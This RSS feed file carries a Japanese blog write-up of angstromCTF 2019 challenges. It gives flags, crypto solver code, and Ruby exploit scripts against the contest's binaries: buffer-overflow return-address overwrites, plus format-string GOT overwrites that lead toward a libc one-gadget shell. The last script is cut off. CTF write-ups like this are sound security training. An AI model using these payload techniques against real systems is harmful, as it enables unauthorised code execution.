<?xml version="1.0" encoding="utf-8" standalone="yes" ?>




<?xml-stylesheet type="text/xsl" href="#stylesheet" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" exclude-result-prefixes="xsl">
    <xsl:output method="html" doctype-system="about:legacy-compat" />
    <xsl:template match="/rss">
      <html lang="en-us">
        <head>
          <meta name="viewport" content="width=device-width, initial-scale=1.0" />
          <title>Posts RSS | $ make life</title>
          <link rel="stylesheet" href="https://owlinux1000.github.io/blog/css/base.min.21688b64210142c045c9a1d930a48fc517f428060c78a3a012d71f971874c5c3.css" integrity="sha256-IWiLZCEBQsBFyaHZMKSPxRf0KAYMeKOgEtcflxh0xcM=" />
        </head>
        <body>
          <nav class="u-background">
  <div class="u-wrapper">
    <ul class="Banner">
      <li class="Banner-item Banner-item--title">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/">$ make life</a>
      </li>
      
      <li class="Banner-item">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/about/">About</a>
      </li>
      
      <li class="Banner-item">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/post/">Posts</a>
      </li>
      
      <li class="Banner-item">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/tags/">Tags</a>
      </li>
      
      <li class="Banner-item">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/categories/">Categories</a>
      </li>
      
      <li class="Banner-item">
        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/index.xml">RSS</a>
      </li>
      
    </ul>
  </div>
</nav>
          <main>
            <div class="u-wrapper">
              <div class="u-padding">
                <h2 class="Heading-title">
                  
                  <a class="Heading-link u-clickable" href="https://owlinux1000.github.io/blog/post/index.xml" rel="bookmark">Posts RSS</a>
                  
                </h2>
                
                <p>
                  To subscribe to this RSS feed, copy its address and paste it into your favorite feed reader.
                </p>
                
              </div>
            </div>
          </main>
          
<footer class="Footer">
  <div class="u-wrapper">
    <div class="u-padding">
      Except where otherwise noted, content on this site is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/" rel="license"> Creative Commons Attribution 4.0 International License</a>.
    </div>
  </div>
</footer>

        </body>
      </html>
    </xsl:template>
  </xsl:stylesheet>
  <channel>
    <title>Posts on $ make life</title>
    <link>https://owlinux1000.github.io/blog/post/</link>
    <description>Recent content in Posts on $ make life</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Thu, 25 Apr 2019 21:57:22 +0900</lastBuildDate>
    <atom:link href="https://owlinux1000.github.io/blog/post/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Angstrom2019 writeup</title>
      <link>https://owlinux1000.github.io/blog/post/angstrom2019/</link>
      <pubDate>Thu, 25 Apr 2019 21:57:22 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/angstrom2019/</guid>
      <description>

&lt;h2 id=&#34;misc&#34;&gt;Misc&lt;/h2&gt;

&lt;h3 id=&#34;irc&#34;&gt;IRC&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;freenodeに入るとFLAG&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{like_discord_but_worse}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;the-mueller-report&#34;&gt;The mueller Report&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;PDFが渡されるので、とりあえず&lt;code&gt;actf&lt;/code&gt;でgrepするとFLAG&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{no0o0o0_col1l1l1luuuusiioooon}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;blank-pdf&#34;&gt;Blank PDF&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;PDFが渡されるが開けず、&lt;code&gt;file&lt;/code&gt;コマンドで見るとPDFとして認識されていないためヘッダーを見るとマジックナンバーがかけているので直してあげると開けるようになりFLAG&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{knot_very_interesting}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;paper-trail&#34;&gt;Paper Trail&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;pcapngが渡されるので、Follow TCP StreamするとIRCで1文字ずつFLAGを送信している&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{fake_math_papers}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;scratch-it-out&#34;&gt;Scratch It Out&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;project.jsonという謎のjsonファイルが渡されるので、キーでいろいろぐぐる＆問題名からプログラミング言語Scratchの話だとわかる&lt;/li&gt;
&lt;li&gt;project.jsonをzipで圧縮し、htt@s://scratch.mit.edu でファイルを読み込まされるとゲームが復元される&lt;/li&gt;
&lt;li&gt;最初の項目が、「旗が押されたとき」なので、画面右らへんの緑色の旗を押すと音声とともにFLAGがでる&lt;/li&gt;
&lt;li&gt;地味に面白い&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{Th5_0pT1maL_LANgUaG3}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;web&#34;&gt;Web&lt;/h2&gt;

&lt;h3 id=&#34;control-you&#34;&gt;Control you&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;HTMLソースを見てFLAG&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{control_u_so_we_can&amp;rsquo;t_control_you}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;crypto&#34;&gt;Crypto&lt;/h2&gt;

&lt;h3 id=&#34;classy-cipher&#34;&gt;Classy Cipher&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;ソースコードが渡され中を見るとシーザ暗号なのでソルバを書く&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{so_charming}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;encrypted &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;:&amp;lt;M?TLH8&amp;lt;A:KFBG@V&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#a2f;font-weight:bold&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#666&#34;&gt;0xff&lt;/span&gt;):
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#a2f;font-weight:bold&#34;&gt;in&lt;/span&gt; encrypted:
        &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#008000&#34;&gt;chr&lt;/span&gt;((&lt;span style=&#34;color:#008000&#34;&gt;ord&lt;/span&gt;(c)&lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt;i) &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0xff&lt;/span&gt;), end&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&#34;really-secure-algorithm&#34;&gt;Really Secure Algorithm&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;RSAのパラメータがe, p, q, cが渡されるので復号するだけ&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{really_securent_algorithm}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;require_relative &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;../../tools/ctf/crypto.rb&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;8337989838551614633430029371803892077156162494012474856684174381868510024755832450406936717727195184311114937042673575494843631977970586746618123352329889&lt;/span&gt;
q &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;7755060911995462151580541927524289685569492828780752345560845093073545403776129013139174889414744570087561926915046519199304042166351530778365529171009493&lt;/span&gt;
e &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;65537&lt;/span&gt;
c &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;7022848098469230958320047471938217952907600532361296142412318653611729265921488278588086423574875352145477376594391159805651080223698576708934993951618464460109422377329972737876060167903857613763294932326619266281725900497427458047861973153012506595691389361443123047595975834017549312356282859235890330349&lt;/span&gt;

rsa &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;RSA&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new(e, &lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; q, &lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt;, q)
m &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; rsa&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;decrypt(c)
&lt;span style=&#34;color:#008000&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;m&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_s(&lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;pack(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;H*&amp;#34;&lt;/span&gt;))&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;half-and-half&#34;&gt;Half and Half&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;ソースコードが渡されるので呼んでソルバを書くだけ

&lt;ul&gt;
&lt;li&gt;24文字を12byteに分割しxor取った値に等しくなるようにする&lt;/li&gt;
&lt;li&gt;フラグフォーマットは、&lt;code&gt;actf{&lt;/code&gt;なので先頭5byteと後半の5byteもxorして判明(&lt;code&gt;taste&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;問題文から&lt;code&gt;taste&lt;/code&gt;に合うような単語で&lt;code&gt;coffee&lt;/code&gt;を&lt;code&gt;actf{&lt;/code&gt;の後に繋げると後半が&lt;code&gt;good&lt;/code&gt;と文章が成り立つ&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{coffee_tastes_good}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;runes&#34;&gt;Runes&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Paillier暗号のパラメータn, g と暗号文cが渡されるので復号するだけ

&lt;ul&gt;
&lt;li&gt;復号時に素数p, qが必要になるが、提供されているnは、factordbでググるとすでに割れている&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{crypto_lives}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;gmp&amp;#39;&lt;/span&gt;

n &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;GMP&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;::&lt;/span&gt;Z(&lt;span style=&#34;color:#666&#34;&gt;99157116611790833573985267443453374677300242114595736901854871276546481648883&lt;/span&gt;)
&lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;310013024566643256138761337388255591613&lt;/span&gt;
q &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;319848228152346890121384041219876391791&lt;/span&gt;
g &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;GMP&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;::&lt;/span&gt;Z(&lt;span style=&#34;color:#666&#34;&gt;99157116611790833573985267443453374677300242114595736901854871276546481648884&lt;/span&gt;)
c &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;GMP&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;::&lt;/span&gt;Z(&lt;span style=&#34;color:#666&#34;&gt;2433283484328067719826123652791700922735828879195114568755579061061723786565164234075183183699826399799223318790711772573290060335232568738641793425546869&lt;/span&gt;)
l &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;GMP&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;::&lt;/span&gt;Z((&lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;lcm(q &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;))
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;L&lt;/span&gt;(u, n)
  (u &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#b68&#34;&gt;/ n
&lt;/span&gt;&lt;span style=&#34;color:#b68&#34;&gt;end
&lt;/span&gt;&lt;span style=&#34;color:#b68&#34;&gt;c_lambda = L(c.powmod(l, n.pow(2)), n)
&lt;/span&gt;&lt;span style=&#34;color:#b68&#34;&gt;g_lambda = GMP::Z(L(g.powmod(l, n.pow(2)), n).to_s.to_i).invert(n)
&lt;/span&gt;&lt;span style=&#34;color:#b68&#34;&gt;m = ((c_lambda * g_lambda) % n).to_s.to_i.to_s(16)
&lt;/span&gt;&lt;span style=&#34;color:#b68&#34;&gt;print([m].pack(&amp;#34;H*&amp;#34;))&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;binary&#34;&gt;Binary&lt;/h2&gt;

&lt;h3 id=&#34;aquarium&#34;&gt;Aquarium&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;gets関数によるBOFがあるバイナリで、flag出力用の関数があるのでそこに飛ばすだけ&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{overflowed_more_than_just_a_fish_tank}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;

&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#z = Sock.new &amp;#34;localhost&amp;#34;, 9999&lt;/span&gt;
z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;shell.actf.co&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;19305&lt;/span&gt;

payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0x98&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; p32(&lt;span style=&#34;color:#666&#34;&gt;0x4011b6&lt;/span&gt;)
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload

&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recv&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&#34;chain-of-rope&#34;&gt;Chain of Rope&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;名前からしてROPかと思ったけど、そうではなく単純なBOFでリターンアドレスをflag出力用関数に書き換えるだけ(Aquariumとまったく同じ)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{dark_web_bargains}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;

&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;

z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;localhost&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;9999&lt;/span&gt;
z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;shell.actf.co&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;19400&lt;/span&gt;

&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;access&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;)
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;

payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0x38&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x401231&lt;/span&gt;)
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload

&lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recv&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&#34;purchases&#34;&gt;Purchases&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;FSBがある64bitバイナリで、flag出力用の関数があるのでそこに飛ばしてあげる&lt;/li&gt;
&lt;li&gt;関数の最後にGOTによるアドレス解決がされていないputs関数があるので、putsのGOTをflag出力関数で上書きする

&lt;ul&gt;
&lt;li&gt;末尾2byteですむので楽に書き換えられる&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{limited_edition_flag}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# z = Sock.new &amp;#34;localhost&amp;#34;, 9999&lt;/span&gt;
z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;shell.actf.co&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;19011&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%4534c%10$hnAAAA&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x18\x40\x40&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;else. &amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recv&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&#34;returns&#34;&gt;Returns&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Purchasesのflag出力用関数が無い版でそれ以外はすべて同じ&lt;/li&gt;
&lt;li&gt;libcが配布されているので、FSBでlibcのアドレスリークして、GOT overwrite でOne gadgetに飛ばしてシェルを奪う&lt;/li&gt;
&lt;li&gt;出力バイトの関係から分割して書き込むために、はじめに&lt;code&gt;puts@got&lt;/code&gt;をmainに書き換えておき何度もFSBを使えるようにする&lt;/li&gt;
&lt;li&gt;&lt;code&gt;__stack_chk_fail@got&lt;/code&gt;は、通常一度も呼ばれないため、ここのGOTをOne gadgetに書き換える&lt;/li&gt;
&lt;li&gt;最後に、&lt;code&gt;puts@got&lt;/code&gt;を&lt;code&gt;__stack_chk_fail@got&lt;/code&gt;になおしてあげればOne gadgetが実行される&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{no_returns_allowed}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# coding: utf-8&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#z = Sock.new &amp;#34;localhost&amp;#34;, 8888&lt;/span&gt;
z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;shell.actf.co&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;19307&lt;/span&gt;
context&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;:debug&lt;/span&gt;
libc &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;ELF&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;./libc.so.6&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#z = Sock.new &amp;#34;shell.actf.co&amp;#34;, 19011&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;

&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# Leaking libc address and overwriting puts@got to the entrypoint of main function&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%4518c%11$hnAAAABBB%17$p&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x18\x40\x40&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
